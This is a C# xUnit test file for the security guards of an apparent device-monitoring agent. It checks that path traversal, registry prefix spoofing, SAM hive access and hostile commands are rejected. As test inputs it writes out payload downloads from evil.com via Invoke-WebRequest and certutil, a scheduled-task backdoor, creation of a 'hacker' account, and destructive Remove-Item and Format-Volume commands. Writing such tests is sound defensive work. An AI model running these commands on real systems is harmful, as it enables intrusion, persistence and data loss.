using AutopilotMonitor.Agent.Core.Monitoring.Telemetry.Gather;
using Xunit;

namespace AutopilotMonitor.Agent.Core.Tests.Collectors
{
    /// <summary>
    /// Tests security guards for remote gather rules.
    /// Prevents: path traversal, prefix spoofing, command injection, privacy leaks.
    /// Critical: segment-bounded matching ensures SOFTWARE\MicrosoftEvil doesn't match SOFTWARE\Microsoft.
    /// </summary>
    public class GatherRuleGuardsTests
    {
        // -- Registry path guards --

        [Fact]
        public void IsRegistryPathAllowed_KnownPrefix_True()
        {
            // SOFTWARE\Microsoft\Enrollments is a known allowed prefix from guardrails.json
            var result = GatherRuleGuards.IsRegistryPathAllowed(
                @"SOFTWARE\Microsoft\Enrollments\{some-guid}\FirstSync");

            Assert.True(result);
        }

        [Fact]
        public void IsRegistryPathAllowed_ExactPrefixMatch_True()
        {
            // Exact match on prefix (no trailing segment)
            var result = GatherRuleGuards.IsRegistryPathAllowed(@"SOFTWARE\Microsoft\Enrollments");

            Assert.True(result);
        }

        [Fact]
        public void IsRegistryPathAllowed_SegmentBounded_BlocksSpoofing()
        {
            // SOFTWARE\Microsoft\EnrollmentsEvil must NOT match SOFTWARE\Microsoft\Enrollments
            // because the character after "Enrollments" is 'E', not '\'
            var result = GatherRuleGuards.IsRegistryPathAllowed(@"SOFTWARE\Microsoft\EnrollmentsEvil\Backdoor");

            Assert.False(result);
        }

        [Fact]
        public void IsRegistryPathAllowed_UnrestrictedMode_AllAllowed()
        {
            var result = GatherRuleGuards.IsRegistryPathAllowed(
                @"SOME\RANDOM\PATH", unrestrictedMode: true);

            Assert.True(result);
        }

        [Fact]
        public void IsRegistryPathAllowed_EmptyPath_False()
        {
            Assert.False(GatherRuleGuards.IsRegistryPathAllowed(null));
            Assert.False(GatherRuleGuards.IsRegistryPathAllowed(""));
        }

        // -- File path guards --

        [Fact]
        public void IsFilePathAllowed_DirectoryTraversal_Blocked()
        {
            // Path normalization via GetFullPath should catch ".." traversal
            var result = GatherRuleGuards.IsFilePathAllowed(
                @"C:\ProgramData\Microsoft\IntuneManagementExtension\..\..\..\..\Users\admin\secrets.txt");

            Assert.False(result);
        }

        [Fact]
        public void IsFilePathAllowed_UsersDir_AlwaysBlocked()
        {
            // C:\Users must be blocked even in unrestricted mode (privacy protection)
            var result = GatherRuleGuards.IsFilePathAllowed(
                @"C:\Users\admin\Documents\file.txt", unrestrictedMode: true);

            Assert.False(result);
        }

        [Fact]
        public void IsFilePathAllowed_SystemConfig_AlwaysBlocked()
        {
            // SAM/SECURITY hives must always be blocked
            var result = GatherRuleGuards.IsFilePathAllowed(
                @"C:\Windows\System32\config\SAM", unrestrictedMode: true);

            Assert.False(result);
        }

        [Fact]
        public void IsFilePathAllowed_EmptyPath_False()
        {
            Assert.False(GatherRuleGuards.IsFilePathAllowed(null));
            Assert.False(GatherRuleGuards.IsFilePathAllowed(""));
        }

        // -- Command guards --

        [Fact]
        public void IsCommandAllowed_HardBlocked_EvenUnrestricted()
        {
            // Download commands must be blocked regardless of unrestricted mode
            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "Invoke-WebRequest http://evil.com/payload.exe", unrestrictedMode: true));

            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "Invoke-RestMethod http://evil.com/api", unrestrictedMode: true));

            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "certutil -urlcache -split -f http://evil.com/payload.exe", unrestrictedMode: true));
        }

        [Fact]
        public void IsCommandAllowed_PersistenceMechanisms_Blocked()
        {
            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "schtasks /create /tn backdoor /tr evil.exe", unrestrictedMode: true));

            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "Register-ScheduledTask -TaskName backdoor", unrestrictedMode: true));
        }

        [Fact]
        public void IsCommandAllowed_UserManipulation_Blocked()
        {
            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "New-LocalUser -Name hacker -NoPassword", unrestrictedMode: true));

            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "net user hacker password123 /add", unrestrictedMode: true));
        }

        [Fact]
        public void IsCommandAllowed_MaxLength_Blocked()
        {
            var longCommand = new string('A', 2001);

            Assert.False(GatherRuleGuards.IsCommandAllowed(longCommand, unrestrictedMode: true));
        }

        [Fact]
        public void IsCommandAllowed_ExactMaxLength_Allowed()
        {
            // Exactly 2000 chars should pass the length check (blocked by allowlist, but not by length)
            var exactCommand = new string('A', 2000);

            // Won't be in allowlist, but should NOT be blocked by length guard
            // In unrestricted mode, should be allowed (passes both length and hard-block checks)
            Assert.True(GatherRuleGuards.IsCommandAllowed(exactCommand, unrestrictedMode: true));
        }

        [Fact]
        public void IsCommandAllowed_EmptyCommand_False()
        {
            Assert.False(GatherRuleGuards.IsCommandAllowed(null));
            Assert.False(GatherRuleGuards.IsCommandAllowed(""));
        }

        [Fact]
        public void IsCommandAllowed_DestructiveOps_Blocked()
        {
            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "Remove-Item -Recurse C:\\ImportantData", unrestrictedMode: true));

            Assert.False(GatherRuleGuards.IsCommandAllowed(
                "Format-Volume -DriveLetter C", unrestrictedMode: true));
        }

        // -- WMI query guards --

        [Fact]
        public void IsWmiQueryAllowed_WhitespaceBoundary()
        {
            // "Win32_OperatingSystemXXX" must NOT match "SELECT * FROM Win32_OperatingSystem"
            // because after the class name there must be whitespace or end of string
            var allowed = GatherRuleGuards.IsWmiQueryAllowed("SELECT * FROM Win32_OperatingSystem");
            var spoofed = GatherRuleGuards.IsWmiQueryAllowed("SELECT * FROM Win32_OperatingSystemXXX");

            // The allowed query should be allowed if it's in the guardrails
            // The spoofed query must NOT be allowed (boundary check)
            if (allowed) // Only test spoofing if the base query is allowed
                Assert.False(spoofed);
        }

        [Fact]
        public void IsWmiQueryAllowed_UnrestrictedMode_AllAllowed()
        {
            var result = GatherRuleGuards.IsWmiQueryAllowed(
                "SELECT * FROM SomeRandomClass", unrestrictedMode: true);

            Assert.True(result);
        }

        [Fact]
        public void IsWmiQueryAllowed_EmptyQuery_False()
        {
            Assert.False(GatherRuleGuards.IsWmiQueryAllowed(null));
            Assert.False(GatherRuleGuards.IsWmiQueryAllowed(""));
        }
    }
}
